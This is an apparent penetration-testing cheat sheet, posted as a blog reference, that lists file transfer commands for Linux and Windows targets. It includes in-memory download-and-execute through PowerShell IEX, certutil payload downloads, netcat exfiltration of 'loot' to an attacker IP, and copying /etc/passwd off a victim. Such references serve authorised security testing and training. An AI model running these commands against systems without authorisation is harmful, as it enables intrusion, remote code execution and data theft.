
---
title: "Reference — File Transfer Methods"
date: 2025-12-02
categories:
  - Tools & Methodologies
  - Reference
tags: [Methodology, File Transfer, Python HTTP Server, Netcat, PowerShell, certutil, SMB, Exfiltration]
description: "File transfer reference — Linux and Windows download/upload methods, netcat transfers, SMB server, base64 encode/decode, and exfiltration techniques."
---

> 📁 **Source:** [github.com/sireton/pentest-vault/00-Meta](https://github.com/sireton/pentest-vault)  
> ← [Back to Methodology Index](/posts/methodology-index/)

---

#meta #filetransfer #windows #linux

## Linux → Target

### Python HTTP Server
```bash
# Attacker
python3 -m http.server 8080

# Victim
wget http://<IP>:8080/<file>
curl -O http://<IP>:8080/<file>
```

### Netcat
```bash
# Receiver
nc -lvnp 4444 > file.exe

# Sender
nc -w 3 <IP> 4444 < file.exe
```

---

## Windows Download Methods

### PowerShell
```powershell
# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/file.ps1')

# Download to disk
(New-Object Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\Windows\Temp\file.exe')

# Invoke-WebRequest
Invoke-WebRequest -Uri 'http://<IP>/file.exe' -OutFile 'C:\Temp\file.exe'
```

### Certutil (LOLBin)
```cmd
certutil.exe -urlcache -split -f http://<IP>/file.exe file.exe
```

### SMB Server (impacket)
```bash
# Attacker
impacket-smbserver share $(pwd) -smb2support -username user -password pass

# Victim
copy \\<IP>\share\file.exe C:\Temp\
```

---

## Linux Download Methods
```bash
wget http://<IP>/file -O /tmp/file
curl http://<IP>/file -o /tmp/file
```

### Base64 Encode/Decode (no outbound HTTP)
```bash
# Attacker
base64 -w 0 file.exe > file.b64

# Victim
echo "<base64string>" | base64 -d > file.exe
```

---

## Exfiltration

### Netcat
```bash
# Attacker receives
nc -lvnp 4444 > loot.zip

# Victim sends
tar czf - /path/to/loot | nc <IP> 4444
```

### SCP
```bash
scp user@<victimIP>:/etc/passwd ./loot/passwd
```

*Previous: [Methodology Tools](/posts/methodology-tools/) · Next: [Methodology Resources](/posts/methodology-resources/)*
